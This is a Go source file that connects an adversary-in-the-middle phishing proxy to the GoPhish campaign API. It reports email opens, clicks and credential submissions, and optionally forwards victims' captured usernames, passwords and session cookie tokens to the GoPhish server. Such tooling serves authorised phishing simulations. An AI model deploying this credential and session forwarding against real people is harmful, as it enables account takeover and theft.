package core

import (
	"crypto/tls"
	"encoding/json"
	"fmt"
	"net/url"

	"github.com/go-resty/resty/v2"
)

type GoPhish struct {
	AdminUrl    *url.URL
	ApiKey      string
	InsecureTLS bool
	Sessions    bool
}

type ResultRequest struct {
	Address    string            `json:"address"`
	UserAgent  string            `json:"user_agent"`
	Username   string            `json:"username,omitempty"` // Use omitempty for optional fields
	Password   string            `json:"password,omitempty"`
	Custom     map[string]string `json:"custom,omitempty"`
	Tokens     string            `json:"tokens,omitempty"`
	HttpTokens map[string]string `json:"http_tokens,omitempty"`
	BodyTokens map[string]string `json:"body_tokens,omitempty"`
}

func NewGoPhish() *GoPhish {
	return &GoPhish{}
}

func (o *GoPhish) Setup(adminUrl string, apiKey string, insecureTLS bool, gophishSessions bool) error {
	if adminUrl == "" {
		return fmt.Errorf("admin URL cannot be empty")
	}

	var err error
	o.AdminUrl, err = url.ParseRequestURI(adminUrl)
	if err != nil {
		return err
	}

	o.ApiKey = apiKey
	o.InsecureTLS = insecureTLS
	o.Sessions = gophishSessions
	return nil
}

func (o *GoPhish) Test() error {
	if err := o.validateSetup(); err != nil {
		return err
	}

	reqUrl := *o.AdminUrl
	reqUrl.Path = "/api/campaigns"
	return o.apiRequest(reqUrl.String(), nil)
}

func (o *GoPhish) ReportEmailOpened(rid, address, userAgent string) error {
	if err := o.validateSetup(); err != nil {
		return err
	}

	req := ResultRequest{
		Address:   address,
		UserAgent: userAgent,
	}

	return o.sendReport(rid, "open", req)
}

func (o *GoPhish) ReportEmailLinkClicked(rid, address, userAgent string) error {
	if err := o.validateSetup(); err != nil {
		return err
	}

	req := ResultRequest{
		Address:   address,
		UserAgent: userAgent,
	}

	return o.sendReport(rid, "click", req)
}

func (o *GoPhish) ReportCredentialsSubmitted(rid string, session *Session, gophishSessions bool) error {
	if err := o.validateSetup(); err != nil {
		return err
	}

	req := ResultRequest{
		Address:   session.RemoteAddr,
		UserAgent: session.UserAgent,
	}

	if gophishSessions {
		req.Username = session.Username
		req.Password = session.Password
		req.Custom = session.Custom
		req.Tokens = (*Terminal).cookieTokensToJSON(nil, session.CookieTokens)
		req.HttpTokens = session.HttpTokens
		req.BodyTokens = session.BodyTokens
	}

	return o.sendReport(rid, "submit", req)
}

func (o *GoPhish) sendReport(rid, action string, req ResultRequest) error {
	content, err := json.Marshal(req)
	if err != nil {
		return err
	}

	reqUrl := *o.AdminUrl
	reqUrl.Path = fmt.Sprintf("/api/results/%s/%s", rid, action)
	return o.apiRequest(reqUrl.String(), content)
}

func (o *GoPhish) apiRequest(reqUrl string, content []byte) error {
	client := resty.New()
	client.SetTLSClientConfig(&tls.Config{
		InsecureSkipVerify: o.InsecureTLS,
	})

	req := client.R().
		SetHeader("Content-Type", "application/json").
		SetAuthToken(o.ApiKey)

	var resp *resty.Response
	var err error

	if content != nil {
		resp, err = req.SetBody(content).Post(reqUrl)
	} else {
		resp, err = req.Get(reqUrl)
	}

	if err != nil {
		return err
	}

	switch resp.StatusCode() {
	case 200:
		return nil
	case 401:
		return fmt.Errorf("invalid API key")
	default:
		return fmt.Errorf("unexpected status: %d", resp.StatusCode())
	}
}

func (o *GoPhish) validateSetup() error {
	if o.AdminUrl == nil {
		return fmt.Errorf("admin URL is not set")
	}
	if o.ApiKey == "" {
		return fmt.Errorf("API key is not set")
	}
	return nil
}
